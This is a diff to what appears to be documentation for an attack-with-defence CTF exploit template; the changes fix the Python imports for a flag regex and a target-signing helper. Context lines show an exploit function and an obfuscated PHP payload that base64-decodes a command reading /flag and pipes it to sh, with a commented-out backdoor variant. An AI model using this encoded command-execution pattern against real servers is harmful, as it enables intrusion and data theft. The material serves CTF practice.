@@ -259,8 +259,8 @@ exp 格式：
 
 ```python
 import requests
-import flag
-import ip
+from flag import FLAG_RE
+from ip import ip_sign
 import base64
 
 id = 1 # 题目id
@@ -293,7 +293,7 @@ system('echo Y2F0IC9mbGFnIHwgYmFzZTY0Cg== | base64 -d | sh');
 
 def exp(ip, port):
   url = 'http://{}:{}'.format(ip, port)
-  sign = ip.ip_sign(url, 'awd-is-fun') # 获得靶机签名，盐记得改
+  sign = ip_sign(url, 'awd-is-fun') # 获得靶机签名，盐记得改
   p = payload.replace('ip_sign', sign)
   # p = backdoor.replace('ip_sign', sign)
   s = requests.Session()
@@ -314,7 +314,7 @@ def exp(ip, port):
     
   # resp = base64.b64decode(resp.encode()).decode()
 
-  flag = flag.FLAG_RE.findall(resp)[0] # 找到flag
+  flag = FLAG_RE.findall(resp)[0] # 找到flag
 
   return flag
 ```
